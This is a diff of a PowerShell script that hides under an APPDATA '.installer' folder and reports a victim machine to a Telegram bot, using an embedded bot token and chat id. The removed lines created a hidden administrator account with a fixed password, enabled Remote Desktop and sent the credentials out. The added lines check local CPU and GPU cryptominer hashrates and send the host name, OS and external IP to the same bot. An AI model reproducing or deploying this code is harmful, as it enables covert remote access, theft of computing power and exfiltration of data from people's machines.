@@ -1,72 +1,104 @@
-# ===== UTF-8 FIX =====
-[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
+# ================= UTF-8 SAFE =================
+$OutputEncoding = [System.Text.Encoding]::UTF8
 
-# ===== SAFETY =====
+# ================= SAFETY ====================
 if ($env:ALLOW_MINING -ne "1") { exit }
 
-# ===== TELEGRAM =====
+# ================= TELEGRAM ==================
 $TG_TOKEN = "8556429231:AAFBKuMMfkrpnxJInSITVaBUD8prYuHcnLw"
 $TG_CHAT  = "5336452267"
 
 function Send-TG($text) {
-    Invoke-RestMethod `
+    $body = @{
+        chat_id = $TG_CHAT
+        text    = $text
+    }
+    $json  = $body | ConvertTo-Json -Depth 5
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
+
+    Invoke-WebRequest `
         -Uri "https://api.telegram.org/bot$TG_TOKEN/sendMessage" `
         -Method POST `
-        -Body @{
-            chat_id = $TG_CHAT
-            text    = $text
-        } `
-        -ErrorAction SilentlyContinue
+        -ContentType "application/json; charset=utf-8" `
+        -Body $bytes `
+        -ErrorAction SilentlyContinue | Out-Null
 }
 
-# ===== PATH =====
+# ================= ONE-TIME ==================
 $BASE = "$env:APPDATA\.installer"
+$marker = "$BASE\reported.flag"
+if (Test-Path $marker) { exit }
 New-Item -ItemType Directory -Force -Path $BASE | Out-Null
 
-# ===== ONE-TIME MARKER =====
-$marker = "$BASE\installed.flag"
-if (Test-Path $marker) { exit }
+# ================= SYSTEM INFO ===============
+$HOST = $env:COMPUTERNAME
+$OS   = (Get-CimInstance Win32_OperatingSystem).Caption
+$TIME = Get-Date
 
-# ===== CREATE USER =====
-$user = "rdpuser"
-$pass = "P@ssw0rd123!"
-$sec  = ConvertTo-SecureString $pass -AsPlainText -Force
-
+# external IP (real)
 try {
-    New-LocalUser -Name $user -Password $sec -PasswordNeverExpires -UserMayNotChangePassword
-} catch {}
+    $IP = (Invoke-RestMethod "https://api.ipify.org").Trim()
+} catch {
+    $IP = "unknown"
+}
 
-Add-LocalGroupMember -Group "Remote Desktop Users" -Member $user -ErrorAction SilentlyContinue
-Add-LocalGroupMember -Group "Administrators" -Member $user -ErrorAction SilentlyContinue
+# ================= TIMEOUT CONFIG ============
+$TIMEOUT = 120
+$STEP = 5
+$elapsed = 0
 
-# ===== ENABLE RDP =====
-Set-ItemProperty `
-  -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" `
-  -Name fDenyTSConnections `
-  -Value 0
+$cpuOK = $false
+$gpuOK = $false
+$cpuHR = 0
+$gpuHR = 0
 
-Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+# ================= WAIT FOR SERVICES =========
+while ($elapsed -lt $TIMEOUT) {
 
-# ===== SYSTEM INFO =====
-$host = $env:COMPUTERNAME
-$who  = $env:USERNAME
-$os   = (Get-CimInstance Win32_OperatingSystem).Caption
-$ip   = (Get-NetIPAddress -AddressFamily IPv4 `
-        | Where-Object {$_.IPAddress -notlike "169.*"} `
-        | Select-Object -First 1).IPAddress
+    try {
+        $cpu = Invoke-RestMethod "http://127.0.0.1:16000/1/summary"
+        $cpuHR = [int]$cpu.hashrate.total[0]
+        if ($cpuHR -gt 0) { $cpuOK = $true }
+    } catch {}
 
-# ===== TELEGRAM MESSAGE (UTF-8 OK) =====
+    try {
+        $gpu = Invoke-RestMethod "http://127.0.0.1:8080/summary"
+        $gpuHR = [int]($gpu.Session.Performance_Summary.Performance * 1000000)
+        if ($gpuHR -gt 0) { $gpuOK = $true }
+    } catch {}
+
+    if ($cpuOK -or $gpuOK) { break }
+
+    Start-Sleep $STEP
+    $elapsed += $STEP
+}
+
+# ================= FINAL STATUS ==============
+if ($cpuOK -and $gpuOK) {
+    $STATUS = "OK"
+} elseif ($cpuOK -or $gpuOK) {
+    $STATUS = "PARTIAL"
+} else {
+    $STATUS = "FAILED"
+}
+
+# ================= REPORT ====================
 Send-TG @"
-🪟 Windows агент установлен
+Windows installer report
 
-Host: $host
-IP: $ip
-User created: $user
-Password: $pass
-OS: $os
-Installed by: $who
-Time: $(Get-Date)
+Status: $STATUS
+Host: $HOST
+External IP: $IP
+OS: $OS
+
+CPU mining: $cpuOK
+CPU hashrate: $cpuHR H/s
+
+GPU mining: $gpuOK
+GPU hashrate: $gpuHR H/s
+
+Elapsed: ${elapsed}s
+Time: $TIME
 "@
 
-# ===== MARK DONE =====
 New-Item -ItemType File -Path $marker | Out-Null
